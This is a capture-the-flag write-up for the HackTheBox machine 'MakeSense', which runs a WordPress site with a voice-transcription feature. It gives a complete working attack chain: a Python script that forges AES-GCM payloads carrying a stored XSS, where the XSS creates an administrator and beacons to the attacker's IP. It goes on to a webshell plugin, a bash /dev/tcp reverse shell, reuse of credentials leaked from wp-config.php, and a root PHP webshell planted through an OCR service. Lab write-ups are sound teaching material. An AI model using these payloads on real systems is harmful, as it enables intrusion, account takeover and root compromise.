# MakeSense — HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Linux (Ubuntu)  
**IP:** 10.129.246.24  
**Author:** guts

---

## Overview

MakeSense is a medium-difficulty Linux box running a custom WordPress 7.0 installation with an AI-powered voice transcription feature. The attack chain involves:

1. Enumerating a WordPress site and its custom JavaScript files
2. Extracting a hardcoded AES encryption key from client-side JS
3. Exploiting a Stored XSS vulnerability via forged encrypted payloads
4. Using the admin's browser session to create a new WordPress admin account
5. Uploading a malicious plugin to gain initial shell access as `www-data`
6. Pivoting to user `walter` using database credentials from `wp-config.php`
7. Abusing a root-run internal OCR PHP service to write a PHP webshell and achieve root

---

## CVEs Affecting This Box

| CVE | Affects | Description |
|---|---|---|
| **CVE-2026-63030** | WordPress 7.0 Core | REST API Batch Route Confusion — a malformed sub-request path desyncs the batch endpoint's internal arrays, allowing unauthenticated requests to be dispatched through the wrong handler |
| **CVE-2026-60137** | WordPress 7.0 Core | SQL Injection in `WP_Query`'s `author__not_in` parameter, reachable through the batch desync from CVE-2026-63030 |

These two CVEs chain together (known as **wp2shell**) to allow pre-auth RCE. However on this box the SQL injection step was blocked/patched at the DB layer, so the intended foothold path is through the **custom voice transcription feature** (Stored XSS), not the CVE chain. The CVEs were confirmed present (batch endpoint desync verified) but the UNION extraction failed, making the XSS path the correct approach.

---

## Step 1 — Reconnaissance (Nmap)

Start with a port scan to identify what is running on the target.

```bash
nmap -sV -sC -p 443 10.129.246.24
```

**Result:**

```
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: WordPress 7.0
| ssl-cert: Subject: commonName=makesense.htb
```

**Key findings:**
- Only HTTPS (port 443) is open
- Apache 2.4.58 on Ubuntu
- WordPress 7.0 is running
- The SSL certificate reveals the hostname `makesense.htb`

Add the hostname to `/etc/hosts`:

```bash
echo "10.129.246.24 makesense.htb" | sudo tee -a /etc/hosts
```

---

## Step 2 — WordPress Enumeration (WPScan)

```bash
wpscan --url https://makesense.htb --disable-tls-checks --enumerate u
```

**Key findings:**

- WordPress version 7.0 (marked Insecure)
- XML-RPC enabled at `/xmlrpc.php`
- Upload directory listing enabled at `/wp-content/uploads/`
- Three users discovered: `admin`, `walter`, `jake`
- Custom theme: `webagency`

---

## Step 3 — Directory Enumeration

With directory listing enabled on `/wp-content/uploads/`, browse the directories:

```bash
curl -sk https://makesense.htb/wp-content/uploads/2026/01/
```

Found: `voice-message.wav` (596K) — a voice recording, test data for the site's AI feature.

Also check the AI models directory:

```bash
curl -sk https://makesense.htb/wp-content/ai-models/
```

Found two AI model directories:
- `whisper-tiny.en/` — OpenAI Whisper for speech-to-text
- `distilbart-cnn-12-6/` — Facebook DistilBART for text summarization

This reveals the site uses a browser-based AI voice transcription pipeline.

---

## Step 4 — Finding the .gitignore

```bash
curl -sk https://makesense.htb/.gitignore
```

The `.gitignore` file is publicly accessible and leaks critical information:

```
*.gguf
*.bin
*.safetensors
wp-content/ai-models/models/
.cache/huggingface/
# Python virtual environment
venv/
```

This confirms:
- A Python backend runs Whisper/HuggingFace models
- Large model files are excluded from the repo but config files are not
- The AI pipeline is custom-built, not a plugin

---

## Step 5 — Analyzing the Custom JavaScript

The page source reveals a custom script:

```
/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

Download and analyze it:

```bash
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js | \
  grep -niE "key|encrypt|decrypt|aes"
```

**Critical discovery — hardcoded encryption key on line 7:**

```javascript
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The full encryption function reveals:

```javascript
async encryptPayload(payload) {
    const encoder = new TextEncoder();
    const data = encoder.encode(JSON.stringify(payload));

    // Derive key using SHA-256
    const keyMaterial = await crypto.subtle.digest('SHA-256',
        encoder.encode(ENCRYPTION_KEY));

    const key = await crypto.subtle.importKey('raw', keyMaterial,
        { name: 'AES-GCM' }, false, ['encrypt']);

    // Random 12-byte IV
    const iv = crypto.getRandomValues(new Uint8Array(12));

    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv: iv }, key, data);

    // Output: IV + ciphertext + auth tag, base64-encoded
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv, 0);
    combined.set(new Uint8Array(encrypted), iv.length);
    return btoa(String.fromCharCode(...combined));
}
```

Also found — the `applySymbolMapping()` function which converts spoken words into special characters:

```javascript
/**
 * Map spoken words to their symbol equivalents for XSS injection
 */
applySymbolMapping(text) {
    const mappings = {
        'open bracket': '<',
        'close bracket': '>',
        'slash': '/',
        ...
    };
}
```

**The comment literally says "for XSS injection"** — this is the intended vulnerability.

---

## Step 6 — Understanding the AJAX Flow

Analyze `main.js` to understand the server communication:

```bash
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js -o main.js
grep -n "save_voice_results\|save_voice_raw\|encryptPayload" main.js
```

**Two-step AJAX flow discovered:**

**Step 1 — Upload raw audio (returns a post_id):**
```
POST /wp-admin/admin-ajax.php
  action=save_voice_raw
  nonce=<page_nonce>
  voice_recording=<WAV file>
```

**Step 2 — Save encrypted results:**
```
POST /wp-admin/admin-ajax.php
  action=save_voice_results
  nonce=<page_nonce>
  post_id=<id from step 1>
  encrypted_payload=<AES-GCM encrypted JSON>
```

The static nonce `d40a5d6ec4` is embedded in every page:
```javascript
var webagency_ajax = {
    "ajax_url": "https://makesense.htb/wp-admin/admin-ajax.php",
    "nonce": "d40a5d6ec4"
};
```

---

## Step 7 — Replicating the Encryption in Python

**Purpose:** The server trusts that only the legitimate browser (which has the encryption key baked into the JS) can submit payloads. By replicating the encryption in Python, we can forge any content — including XSS — as if it came from a real browser, completely bypassing this "protection".

**Install the required library first:**

```bash
pip install pycryptodome --break-system-packages
```

**Save this as `encrypt_payload.py` on your Kali machine:**

```python
#!/usr/bin/env python3
"""
encrypt_payload.py — MakeSense HTB
Purpose : Forge AES-GCM encrypted payloads that the WordPress server
          will decrypt and store. Used to inject XSS into the
          voice transcription results viewed by the admin.

Usage   : python3 encrypt_payload.py
Output  : Prints a base64 string — copy this as the encrypted_payload
          value in the curl POST to save_voice_results.

Requires: pip install pycryptodome --break-system-packages
"""

import hashlib
import base64
import os
import json
from Crypto.Cipher import AES

# ---------------------------------------------------------------
# The encryption key is hardcoded in whisper-wrapper.js line 7:
#   const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
# ---------------------------------------------------------------
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

# Step 1: Derive the actual AES key
# The JS uses crypto.subtle.digest('SHA-256', encode(ENCRYPTION_KEY))
# which produces a 32-byte key — perfect for AES-256
key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()


def encrypt_payload(payload_dict):
    """
    Encrypts a dict using AES-256-GCM, matching the JS encryptPayload() exactly.

    The output format is: base64( IV[12 bytes] + ciphertext + auth_tag[16 bytes] )
    - IV  : 12 random bytes (standard for AES-GCM)
    - tag : 16-byte authentication tag (WebCrypto appends this automatically;
            pycryptodome returns it separately so we append it manually)
    """
    data = json.dumps(payload_dict).encode()   # JSON → bytes
    iv = os.urandom(12)                        # fresh random IV every call
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    combined = iv + ciphertext + tag           # assemble in same order as JS
    return base64.b64encode(combined).decode()


# ---------------------------------------------------------------
# PAYLOAD — edit YOUR_KALI_IP before running
# This XSS makes the admin's browser:
#   1. Fetch the user-new.php page to grab a fresh WP nonce
#   2. POST a request to create a new administrator account
#   3. Beacon back to our listener so we know it worked
# ---------------------------------------------------------------
YOUR_KALI_IP = "10.10.14.XX"   # <-- change this to your tun0 IP

payload = {
    "transcription": f"""<script>
fetch('/wp-admin/user-new.php')
.then(r=>r.text())
.then(html=>{{
    const m=html.match(/name="_wpnonce_create-user" value="([^"]+)"/);
    const nonce=m?m[1]:'NOTFOUND';
    fetch('http://{YOUR_KALI_IP}:8000/debug?nonce='+nonce);
    if(!m)return;
    const data=new URLSearchParams();
    data.append('action','createuser');
    data.append('_wpnonce_create-user',nonce);
    data.append('user_login','hacker1337');
    data.append('email','hacker1337@evil.com');
    data.append('pass1','Hacker1337!');
    data.append('pass2','Hacker1337!');
    data.append('role','administrator');
    data.append('createuser','Add New User');
    return fetch('/wp-admin/user-new.php',{{
        method:'POST',
        body:data,
        headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
        credentials:'include'
    }});
}}).then(r=>r&&fetch('http://{YOUR_KALI_IP}:8000/done?status='+r.status));
</script>""",
    "summary": "test"
}

encrypted = encrypt_payload(payload)
print(encrypted)
```

**How to run it:**

```bash
# 1. Edit YOUR_KALI_IP in the script first
nano encrypt_payload.py

# 2. Run it — it prints the base64 blob to stdout
python3 encrypt_payload.py
```

The output looks like a long base64 string. Copy it — you will paste it as the `encrypted_payload` value in the next step.

---

## Step 8 — Stored XSS via Forged Encrypted Payload

The server decrypts the payload and stores the `transcription` field in the database without sanitizing it. When an administrator views the voice submissions dashboard, the stored XSS fires in their authenticated browser session.

**What the XSS does (step by step):**

1. The admin's browser fetches `/wp-admin/user-new.php` to extract a valid WordPress nonce
2. It uses that nonce to POST a user-creation request as the admin
3. A new administrator account `hacker1337` / `Hacker1337!` is created
4. The browser hits our listener at `/done?status=200` confirming success

**Deliver the payload:**

```bash
# Terminal 1 — start listener to catch admin bot callbacks
python3 -m http.server 8000

# Terminal 2 — run the encryption script (edit IP first)
python3 encrypt_payload.py
# Copy the output

# Step 1: Upload a silent WAV to get a valid post_id
sox -n -r 16000 -c 1 silence.wav trim 0 1

curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_raw" \
  -F "nonce=d40a5d6ec4" \
  -F "voice_recording=@silence.wav;filename=voice-message.wav;type=audio/wav"
# Returns: {"success":true,"data":{"post_id":75}}

# Step 2: Send the forged encrypted payload (paste your base64 output)
curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=save_voice_results" \
  -F "nonce=d40a5d6ec4" \
  -F "post_id=75" \
  -F "encrypted_payload=PASTE_BASE64_HERE"
# Returns: {"success":true,"data":{"message":"Results saved successfully!","post_id":75}}
```

Within ~60 seconds, the admin bot visits the dashboard. The listener shows:

```
10.129.246.24 - - "GET /debug?nonce=abc123 HTTP/1.1" 404 -
10.129.246.24 - - "GET /done?status=200 HTTP/1.1" 404 -
```

`/debug` confirms the nonce was extracted. `status=200` confirms account creation succeeded.

---

## Step 9 — Logging Into WordPress as Admin

```bash
curl -sk -X POST https://makesense.htb/wp-login.php \
  -d 'log=hacker1337&pwd=Hacker1337!&wp-submit=Log+In&testcookie=1' \
  -c cookies.txt \
  -b 'wordpress_test_cookie=WP+Cookie+check' \
  -L -D headers.txt -o /dev/null
```

Handle the admin email confirmation page (WordPress shows this to new admins):

```bash
# Fetch the confirmation page
curl -sk https://makesense.htb/wp-login.php?action=confirm_admin_email \
  -b cookies.txt -c cookies.txt -o confirm.html

# Extract the confirmation nonce
NONCE=$(grep -oP 'confirm_admin_email_nonce" value="\K[^"]+' confirm.html)

# Submit the confirmation
curl -sk -X POST 'https://makesense.htb/wp-login.php?action=confirm_admin_email' \
  -b cookies.txt -c cookies.txt \
  -d "confirm_admin_email_nonce=$NONCE&correct-admin-email=The+email+is+correct&redirect_to=https%3A%2F%2Fmakesense.htb%2Fwp-admin%2F" \
  -L -o /dev/null
```

---

## Step 10 — Malicious Plugin Upload (RCE as www-data)

WordPress allows admins to upload and install plugins packaged as ZIP files. We abuse this to upload a PHP webshell disguised as a plugin.

**Why this works:** Any `.php` file in a WordPress plugin is served directly by Apache and executed as `www-data`. The Plugin Name comment in the PHP header is all WordPress requires to treat it as a valid plugin.

**Create the plugin ZIP:**

```bash
mkdir -p /tmp/shell_plugin

# shell.php — minimal WordPress plugin containing a webshell
cat > /tmp/shell_plugin/shell.php << 'EOF'
<?php
/*
Plugin Name: Shell
*/
if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);}
EOF

cd /tmp && zip -r shell_plugin.zip shell_plugin/
```

**Upload via WordPress admin:**

```bash
# Get a fresh upload nonce from the plugin install page
curl -sk 'https://makesense.htb/wp-admin/plugin-install.php?tab=upload' \
  -b cookies.txt -c cookies.txt -o upload.html

NONCE=$(grep -oP 'name="_wpnonce" value="\K[^"]+' upload.html)

# Upload and install the plugin
curl -sk -X POST 'https://makesense.htb/wp-admin/update.php?action=upload-plugin' \
  -b cookies.txt -c cookies.txt \
  -F "_wpnonce=$NONCE" \
  -F "_wp_http_referer=/wp-admin/plugin-install.php" \
  -F 'install-plugin-submit=Install Now' \
  -F "pluginzip=@/tmp/shell_plugin.zip;type=application/zip" | grep "Plugin installed"
# Plugin installed successfully.

# Activate the plugin using the nonce from the install response
curl -sk 'https://makesense.htb/wp-admin/plugins.php?action=activate&plugin=shell_plugin%2Fshell.php&_wpnonce=<ACTIVATE_NONCE>' \
  -b cookies.txt -c cookies.txt -L
```

**Test the webshell:**

```bash
curl -sk 'https://makesense.htb/wp-content/plugins/shell_plugin/shell.php?cmd=id'
# Returns: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Get a reverse shell:**

```bash
# Listener on Kali
nc -lvnp 4444

# Trigger reverse shell
curl -sk "https://makesense.htb/wp-content/plugins/shell_plugin/shell.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1"'
```

---

## Step 11 — Privilege Escalation to Walter (wp-config.php)

From the `www-data` shell, read the WordPress database credentials:

```bash
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD"
# define( 'DB_USER', 'walter' );
# define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

These database credentials are reused as the system SSH password for user `walter`:

```bash
ssh walter@makesense.htb
# Password: JbhHDAEgXvri3!
```

Grab the user flag:

```bash
cat /home/walter/user.txt
```

---

## Step 12 — Privilege Escalation to Root (Internal OCR Service)

Check running processes for anything unusual:

```bash
ps aux | grep root
```

Spot this:

```
root  1410  php -S 127.0.0.1:8001 -t /root/ocr4/
```

**What this means:** A PHP built-in web server is running on localhost port 8001, serving files from `/root/ocr4/`, and the process owner is `root`. This means every PHP file it executes runs with root privileges.

Probe the service with walter's credentials (same password works for HTTP Basic auth):

```bash
curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/
```

The service is a handwriting OCR tool — you draw text on an HTML5 canvas, it OCRs the image using Tesseract, then lets you save the recognized text to a file under `/root/ocr4/saved/`. Since the PHP server runs as root, `saved/` is written as root, and any `.php` file placed there executes as root when accessed via the same server.

**The attack — write a PHP webshell through the OCR service:**

**On Kali — generate an image containing PHP webshell text using PIL:**

```python
# Save as make_payload_image.py and run: python3 make_payload_image.py
from PIL import Image, ImageDraw, ImageFont

text = "<?php system($_GET['c']); ?>"
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 48)
img = Image.new('RGB', (900, 100), 'white')
d = ImageDraw.Draw(img)
d.text((10, 20), text, fill='black', font=font)
img.save('/tmp/payload.png')
print("Image saved to /tmp/payload.png")
```

```bash
pip install Pillow --break-system-packages
python3 make_payload_image.py

# Verify Tesseract can read it correctly
tesseract /tmp/payload.png stdout
# Should output: <?php system($_GET['c']); ?>

# Transfer to the target
scp /tmp/payload.png walter@makesense.htb:/tmp/
```

**On walter's shell — OCR the image and save as pwn.php:**

```bash
# Convert image to base64 dataURL (the format the service expects)
B64="data:image/png;base64,$(base64 -w0 /tmp/payload.png)"

# Step 1: POST the image to the OCR service (use session cookie to tie the result)
curl -s -u "walter:JbhHDAEgXvri3!" \
  -c /tmp/s.txt -b /tmp/s.txt \
  -X POST http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=$B64" > /tmp/r.html

# Step 2: Extract the OCR session ID from the response
OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' /tmp/r.html)
echo "OCR_ID: $OCR_ID"

# Verify the PHP code was read correctly
grep "output-text" -A3 /tmp/r.html
# Should show: <?php system($_GET['c']); ?>

# Step 3: Save the recognized text as a PHP file
# The service saves to /root/ocr4/saved/pwn.php (served by the root PHP server)
curl -s -u "walter:JbhHDAEgXvri3!" \
  -c /tmp/s.txt -b /tmp/s.txt \
  -X POST http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode "filename=pwn.php" \
  --data-urlencode "save_output=Save" | grep "notice"
# Returns: Saved as: saved/pwn.php
```

**Step 4 — Execute the webshell through the root-owned PHP server:**

```bash
# Confirm RCE as root
curl -s -u "walter:JbhHDAEgXvri3!" \
  "http://127.0.0.1:8001/saved/pwn.php?c=id"
# uid=0(root) gid=0(root) groups=0(root)

# Read the root flag
curl -s -u "walter:JbhHDAEgXvri3!" \
  "http://127.0.0.1:8001/saved/pwn.php?c=cat+/root/root.txt"
```

---

## Attack Chain Summary

```
nmap → WordPress 7.0 on HTTPS (port 443 only)
  ↓
WPScan → users: admin, walter, jake | WP 7.0 (CVE-2026-63030 + CVE-2026-60137 confirmed but SQLi blocked)
  ↓
.gitignore → AI pipeline (Whisper + DistilBART), Python venv, backup paths
  ↓
whisper-wrapper.js → hardcoded AES key: bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI
  ↓
main.js → AJAX flow: save_voice_raw (post_id) → save_voice_results (encrypted_payload)
  ↓
encrypt_payload.py → AES-GCM forged XSS payload in transcription field
  ↓
Admin bot views submission → XSS fires → extracts WP nonce → creates hacker1337 admin
  ↓
Login as hacker1337 → upload shell_plugin.zip → www-data shell
  ↓
wp-config.php → walter / JbhHDAEgXvri3! → SSH → user.txt
  ↓
ps aux → php -S 127.0.0.1:8001 -t /root/ocr4/ (running as root)
  ↓
make_payload_image.py (PIL) → PNG of PHP webshell → OCR → save as pwn.php
  ↓
http://127.0.0.1:8001/saved/pwn.php?c=id → uid=0(root) → root.txt
```

---

## Scripts Reference

| Filename | Purpose | How to run |
|---|---|---|
| `encrypt_payload.py` | Forges AES-GCM encrypted XSS payload using the leaked key from `whisper-wrapper.js` | `python3 encrypt_payload.py` — edit `YOUR_KALI_IP` first |
| `make_payload_image.py` | Creates a PNG image containing PHP webshell text in a font that Tesseract reads accurately | `python3 make_payload_image.py` — requires `pip install Pillow` |
| `shell_plugin/shell.php` | Minimal WordPress plugin containing a PHP webshell | Zip it and upload via WP admin. Access at `/wp-content/plugins/shell_plugin/shell.php?cmd=id` |

---

## Key Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Hardcoded AES key in client-side JS | `whisper-wrapper.js` line 7 | Allows forgery of any encrypted payload |
| No server-side input sanitization | `save_voice_results` AJAX handler | Stored XSS when admin views transcriptions |
| Stored XSS → admin account creation | WordPress voice dashboard | Full admin takeover without knowing any password |
| Malicious plugin upload | WordPress admin panel | RCE as `www-data` |
| Credential reuse | `wp-config.php` DB password = SSH password | Lateral movement to `walter` |
| Root PHP server saves attacker content | `/root/ocr4/` OCR service | PHP webshell executes as root |

---

## Lessons Learned

- **Never hardcode encryption keys in client-side JavaScript.** The key is visible to anyone who views page source — it is not a secret.
- **Encryption is not a substitute for input sanitization.** The server encrypts the payload to "protect" it but then decrypts and stores it unsanitized. The attacker just has to use the same encryption.
- **Services running as root that write user-controlled content are a critical privilege escalation path.** A PHP server running as root that writes attacker-chosen filenames with attacker-chosen content is essentially a root shell waiting to be triggered.
- **Database credentials in `wp-config.php` are often reused as system passwords.** Always use independent, unique credentials for each service.
- **The `applySymbolMapping()` function comment** ("for XSS injection") is a reminder that debug or developer notes left in production code can directly guide an attacker to the vulnerability.
